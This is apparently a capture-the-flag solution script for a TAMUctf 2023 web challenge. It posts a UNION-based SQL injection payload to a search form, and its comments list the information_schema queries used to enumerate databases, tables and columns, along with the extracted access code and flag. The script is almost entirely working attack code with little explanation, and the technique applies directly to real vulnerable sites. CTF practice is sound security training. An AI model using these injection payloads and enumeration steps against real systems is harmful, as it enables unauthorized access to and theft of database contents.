import requests
url = "http://lost-and-forgotten.tamuctf.com/search.php"
data = {"query": "asdasdasd%' union select access_code, title,1,1,1,1 from writeups.articles -- -"}
# select schema_name,1,1,1,1,1 from information_schema.schemata
# Get database 'writeups'
# select TABLE_NAME,1,1,1,1,1 from information_schema.tables where table_schema = 'writeups'
# Get table 'articles'
# select column_name,1,1,1,1,1 from information_schema.columns where table_name = 'articles'
# Get column 'access_code'
# select access_code, title,1,1,1,1 from writeups.articles
# Access code of TAMUctf 2023 Writeups: ba65ba9416d8e53c5d02006b2962d27e
# Gained Access!
req = requests.post(url=url, data=data)
print(req.status_code)
print(req.text)

# Flag: tamuctf{st4te_0f_th3_UNION_1njecti0n}